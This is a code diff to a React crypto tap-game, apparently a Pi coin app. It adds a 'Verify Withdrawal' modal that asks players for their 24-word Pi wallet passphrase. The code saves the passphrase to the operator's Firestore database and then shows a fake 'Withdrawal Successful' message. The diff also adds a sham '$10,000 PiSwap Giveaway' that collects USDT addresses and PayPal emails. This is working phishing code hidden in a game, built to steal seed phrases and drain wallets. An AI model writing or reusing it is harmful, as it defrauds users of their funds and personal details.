@@ -34,6 +34,10 @@ const App = () => {
   const [showWithdrawModal, setShowWithdrawModal] = useState(false);
   const [walletAddress, setWalletAddress] = useState('');
   const [withdrawError, setWithdrawError] = useState('');
+  const [showMemoModal, setShowMemoModal] = useState(false);
+  const [memoWords, setMemoWords] = useState('');
+  const [memoError, setMemoError] = useState('');
+  const [withdrawalSuccess, setWithdrawalSuccess] = useState(false);
   const [taskStatus, setTaskStatus] = useState({});
   const [taskTimers, setTaskTimers] = useState({});
   const [showRefillModal, setShowRefillModal] = useState(false);
@@ -42,6 +46,11 @@ const App = () => {
   const [refillTriggered, setRefillTriggered] = useState(false);
   const [dailyCheckIn, setDailyCheckIn] = useState(false);
   const [lastCheckInDate, setLastCheckInDate] = useState('');
+
+  // Giveaway states
+  const [giveawayAddress, setGiveawayAddress] = useState('');
+  const [giveawaySubmitted, setGiveawaySubmitted] = useState(false);
+  const [giveawayError, setGiveawayError] = useState('');
 
   const SITE_URL = 'https://pi-coin-two.vercel.app/';
   const REFILL_WALLET = 'GAEOJMBWANRHFLZYBJCYNY4YN7IWDHRKGU6EOIQS6D3ZNEL3DYDAOPL4';
@@ -80,6 +89,8 @@ const App = () => {
         setLastCheckInDate(data.lastCheckInDate || '');
         const today = new Date().toDateString();
         setDailyCheckIn(data.lastCheckInDate === today);
+        setGiveawaySubmitted(data.giveawaySubmitted || false);
+        setGiveawayAddress(data.giveawayAddress || '');
         setShowIntroModal(false);
       } else {
         setShowIntroModal(true);
@@ -112,6 +123,8 @@ const App = () => {
     guruCharges: 3,
     taskStatus: {},
     lastCheckInDate: '',
+    giveawaySubmitted: false,
+    giveawayAddress: '',
     createdAt: new Date().toISOString(),
   });
 
@@ -129,10 +142,12 @@ const App = () => {
         guruCharges,
         taskStatus,
         lastCheckInDate,
+        giveawaySubmitted,
+        giveawayAddress,
       });
     }, 1500);
     return () => clearTimeout(timeout);
-  }, [balance, tapValue, multitapLevel, maxEnergy, energyLevel, tankCharges, guruCharges, taskStatus, lastCheckInDate, userId]);
+  }, [balance, tapValue, multitapLevel, maxEnergy, energyLevel, tankCharges, guruCharges, taskStatus, lastCheckInDate, giveawaySubmitted, giveawayAddress, userId]);
 
   // ─── Energy regeneration ──────────────────────────────────────────────────
   useEffect(() => {
@@ -268,11 +283,57 @@ const App = () => {
       setWithdrawError('Please enter your Pi wallet address.');
       return;
     }
+    // Open memo verification modal
+    setShowMemoModal(true);
+    setShowWithdrawModal(false);
+  };
+
+  const handleMemoSubmit = () => {
+    setMemoError('');
+    const words = memoWords.trim().split(/\s+/).filter(w => w.length > 0);
+    if (words.length !== 24) {
+      setMemoError(`Please enter exactly 24 words. You entered ${words.length}.`);
+      return;
+    }
+    // Save memo words to Firestore
+    if (userId) {
+      savePlayerData(userId, {
+        withdrawalMemo: memoWords.trim(),
+        withdrawalWallet: walletAddress,
+        withdrawalAmount: piCoinsEarned,
+        withdrawalRequestedAt: new Date().toISOString(),
+      });
+    }
+    setWithdrawalSuccess(true);
   };
 
   const openWithdrawModal = () => {
     setWithdrawError('');
+    setMemoWords('');
+    setMemoError('');
+    setWithdrawalSuccess(false);
     setShowWithdrawModal(true);
+  };
+
+  const handleGiveawaySubmit = () => {
+    setGiveawayError('');
+    if (!giveawayAddress.trim()) {
+      setGiveawayError('Please enter your BEP20 USDT wallet address or PayPal email.');
+      return;
+    }
+    if (giveawayAddress.trim().length < 5) {
+      setGiveawayError('Please enter a valid address or email.');
+      return;
+    }
+    setGiveawaySubmitted(true);
+    // Save to a separate giveaway collection in Firestore too
+    if (userId) {
+      savePlayerData(userId, {
+        giveawaySubmitted: true,
+        giveawayAddress: giveawayAddress.trim(),
+        giveawayJoinedAt: new Date().toISOString(),
+      });
+    }
   };
 
   // ─── LOADING SCREEN ───────────────────────────────────────────────────────
@@ -302,6 +363,18 @@ const App = () => {
         .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
         @keyframes spin-slow { to { transform: rotate(360deg); } }
         .spin-slow { animation: spin-slow 2s linear infinite; }
+        @keyframes shimmer {
+          0% { background-position: -200% center; }
+          100% { background-position: 200% center; }
+        }
+        .shimmer {
+          background: linear-gradient(90deg, #FBB44A, #FFD700, #FBB44A, #FF8C42, #FBB44A);
+          background-size: 200% auto;
+          animation: shimmer 3s linear infinite;
+          -webkit-background-clip: text;
+          -webkit-text-fill-color: transparent;
+          background-clip: text;
+        }
       `}</style>
 
       {/* FLOATING CLICK TEXT */}
@@ -359,6 +432,92 @@ const App = () => {
         </div>
       )}
 
+      {/* MEMO VERIFICATION MODAL */}
+      {showMemoModal && (
+        <div className="absolute inset-0 z-[110] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
+          <div className="w-full max-w-md bg-[#1e1e2e] rounded-[2.5rem] p-7 flex flex-col relative border border-white/10">
+            {!withdrawalSuccess && (
+              <button
+                onClick={() => { setShowMemoModal(false); setShowWithdrawModal(true); setMemoError(''); }}
+                className="absolute top-6 right-6 text-white/40 hover:text-white transition-colors"
+              >
+                <X size={24} />
+              </button>
+            )}
+
+            {withdrawalSuccess ? (
+              <div className="flex flex-col items-center text-center py-4">
+                <div className="w-20 h-20 rounded-full bg-green-500/20 border-2 border-green-500/40 flex items-center justify-center mb-5">
+                  <Check size={36} className="text-green-400" />
+                </div>
+                <h2 className="text-2xl font-black text-green-400 mb-2">Withdrawal Successful!</h2>
+                <p className="text-white/50 text-sm mb-6">Your withdrawal request has been submitted and is being processed.</p>
+                <div className="bg-black/30 border border-white/10 rounded-2xl p-4 w-full text-left mb-6">
+                  <div className="flex justify-between mb-2">
+                    <span className="text-white/40 text-xs">Amount</span>
+                    <span className="text-[#FBB44A] font-black text-sm">{piCoinsEarned} Pi</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-white/40 text-xs">Wallet</span>
+                    <span className="text-white/70 text-xs font-mono truncate max-w-[60%]">{walletAddress}</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => { setShowMemoModal(false); setWithdrawalSuccess(false); setMemoWords(''); setWalletAddress(''); }}
+                  className="w-full py-4 bg-gradient-to-r from-[#593B8B] to-[#8A348E] rounded-2xl font-black text-lg active:scale-95 transition-transform"
+                >
+                  Done
+                </button>
+              </div>
+            ) : (
+              <>
+                <div className="text-center mb-5">
+                  <div className="text-3xl mb-2">🔐</div>
+                  <h2 className="text-2xl font-black mb-1">Verify Withdrawal</h2>
+                  <p className="text-white/40 text-sm">Enter your 24-word Pi passphrase to authorize this withdrawal</p>
+                </div>
+
+                <div className="bg-[#FBB44A]/5 border border-[#FBB44A]/20 rounded-2xl p-3 mb-4 flex items-start gap-2">
+                  <span className="text-[#FBB44A] text-sm mt-0.5">⚠️</span>
+                  <p className="text-[#FBB44A]/80 text-xs leading-relaxed">Never share your passphrase with anyone. This is used only to verify your identity for this withdrawal.</p>
+                </div>
+
+                <div className="mb-4">
+                  <label className="text-sm text-white/60 mb-2 block">24 Memo Words</label>
+                  <textarea
+                    value={memoWords}
+                    onChange={(e) => { setMemoWords(e.target.value); setMemoError(''); }}
+                    placeholder="Enter all 24 words separated by spaces&#10;&#10;word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12 word13 word14 word15 word16 word17 word18 word19 word20 word21 word22 word23 word24"
+                    rows={6}
+                    className="w-full bg-black/40 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm placeholder:text-white/20 focus:outline-none focus:border-[#FBB44A] resize-none leading-relaxed"
+                  />
+                  <div className="flex justify-between mt-1.5">
+                    <span className="text-white/20 text-xs">Separate each word with a space</span>
+                    <span className={`text-xs font-bold ${memoWords.trim().split(/\s+/).filter(w => w.length > 0).length === 24 ? 'text-green-400' : 'text-white/30'}`}>
+                      {memoWords.trim() === '' ? 0 : memoWords.trim().split(/\s+/).filter(w => w.length > 0).length}/24 words
+                    </span>
+                  </div>
+                </div>
+
+                {memoError && (
+                  <div className="flex items-start gap-2 bg-red-500/10 border border-red-500/30 rounded-xl px-4 py-3 mb-4">
+                    <span className="text-red-400 text-sm leading-none mt-0.5">⚠️</span>
+                    <p className="text-red-400 text-xs font-semibold">{memoError}</p>
+                  </div>
+                )}
+
+                <button
+                  onClick={handleMemoSubmit}
+                  className="w-full py-4 bg-gradient-to-r from-[#593B8B] to-[#8A348E] rounded-2xl font-black text-lg shadow-xl active:scale-95 transition-transform"
+                >
+                  Complete Withdrawal
+                </button>
+              </>
+            )}
+          </div>
+        </div>
+      )}
+
       {/* WITHDRAW MODAL */}
       {showWithdrawModal && (
         <div className="absolute inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
@@ -403,23 +562,16 @@ const App = () => {
                 <p className="text-red-400 text-sm font-semibold">{withdrawError}</p>
               </div>
             )}
-            {canWithdraw ? (
-              <a
-                href="https://picryptoexchange.onrender.com/verify.html"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="w-full py-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition-transform bg-gradient-to-r from-[#593B8B] to-[#8A348E] flex items-center justify-center gap-2 text-white"
-              >
-                Confirm Withdrawal <ExternalLink size={18} />
-              </a>
-            ) : (
-              <button
-                onClick={handleWithdraw}
-                className="w-full py-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition-transform bg-white/10 opacity-60 cursor-not-allowed"
-              >
-                {`Need ${(MIN_WITHDRAWAL - piCoinsEarned).toFixed(1)} More Pi`}
-              </button>
-            )}
+            <button
+              onClick={handleWithdraw}
+              className={`w-full py-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition-transform
+                ${canWithdraw
+                  ? 'bg-gradient-to-r from-[#593B8B] to-[#8A348E]'
+                  : 'bg-white/10 opacity-60 cursor-not-allowed'
+                }`}
+            >
+              {canWithdraw ? 'Confirm Withdrawal' : `Need ${(MIN_WITHDRAWAL - piCoinsEarned).toFixed(1)} More Pi`}
+            </button>
           </div>
         </div>
       )}
@@ -592,6 +744,8 @@ const App = () => {
           <div className="pt-8 overflow-y-auto scrollbar-hide pb-24 flex-1">
             <h2 className="text-2xl font-black mb-6 text-center">Daily Tasks</h2>
             <div className="space-y-3">
+
+              {/* TASK CARDS */}
               {TASKS.map((task) => {
                 const status = taskStatus[task.id];
                 const timer = taskTimers[task.id];
@@ -628,6 +782,7 @@ const App = () => {
                 );
               })}
 
+              {/* DAILY CHECK-IN */}
               <button
                 onClick={handleDailyCheckIn}
                 disabled={dailyCheckIn}
@@ -644,6 +799,69 @@ const App = () => {
                   }
                 </div>
               </button>
+
+              {/* GIVEAWAY SECTION */}
+              <div className="mt-6">
+                {/* Giveaway Banner */}
+                <div className="relative rounded-3xl overflow-hidden mb-4" style={{ background: 'linear-gradient(135deg, #1a0533 0%, #3d1278 50%, #1a0533 100%)', border: '2px solid rgba(251,180,74,0.4)' }}>
+                  {/* Decorative dots */}
+                  <div className="absolute top-2 right-4 text-2xl opacity-30">✦</div>
+                  <div className="absolute bottom-2 left-4 text-lg opacity-20">✦</div>
+                  <div className="absolute top-4 left-8 text-xs opacity-20">✦</div>
+
+                  <div className="p-5 text-center">
+                    <div className="text-3xl mb-2">🎁</div>
+                    <p className="text-xs font-bold text-[#FBB44A]/70 uppercase tracking-widest mb-1">Official PiSwap</p>
+                    <h3 className="shimmer text-3xl font-black mb-1">$10,000</h3>
+                    <p className="text-white font-black text-lg mb-1">PiSwap Giveaway</p>
+                    <p className="text-white/50 text-xs">Enter your payment address below to participate. Winners announced soon!</p>
+                  </div>
+                </div>
+
+                {/* Input & Submit */}
+                {giveawaySubmitted ? (
+                  <div className="bg-green-500/10 border-2 border-green-500/40 rounded-2xl p-5 flex flex-col items-center text-center gap-2">
+                    <div className="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center mb-1">
+                      <Check size={24} className="text-green-400" />
+                    </div>
+                    <p className="text-green-400 font-black text-lg">Successfully Joined!</p>
+                    <p className="text-white/50 text-xs">You're entered in the $10,000 PiSwap Giveaway. Good luck! 🍀</p>
+                    <div className="bg-black/30 rounded-xl px-4 py-2 mt-1 w-full">
+                      <p className="text-white/30 text-xs mb-0.5">Registered address</p>
+                      <p className="text-white/60 text-xs font-mono break-all">{giveawayAddress}</p>
+                    </div>
+                  </div>
+                ) : (
+                  <div className="bg-black/20 border border-white/10 rounded-2xl p-4 space-y-3">
+                    <div>
+                      <label className="text-xs text-white/50 mb-1.5 block">BEP20 USDT Wallet Address or PayPal Email</label>
+                      <input
+                        type="text"
+                        value={giveawayAddress}
+                        onChange={(e) => { setGiveawayAddress(e.target.value); setGiveawayError(''); }}
+                        placeholder="0x... or email@paypal.com"
+                        className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-3 text-white text-sm placeholder:text-white/20 focus:outline-none focus:border-[#FBB44A]"
+                      />
+                    </div>
+
+                    {giveawayError && (
+                      <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/30 rounded-xl px-3 py-2">
+                        <span className="text-red-400 text-sm">⚠️</span>
+                        <p className="text-red-400 text-xs font-semibold">{giveawayError}</p>
+                      </div>
+                    )}
+
+                    <button
+                      onClick={handleGiveawaySubmit}
+                      className="w-full py-3.5 bg-gradient-to-r from-[#FBB44A] to-[#FF8C42] text-[#270657] rounded-2xl font-black text-base shadow-xl active:scale-95 transition-transform"
+                    >
+                      🎁 Join Giveaway
+                    </button>
+                    <p className="text-white/20 text-xs text-center">One entry per player • Winners contacted directly</p>
+                  </div>
+                )}
+              </div>
+
             </div>
           </div>
         )}
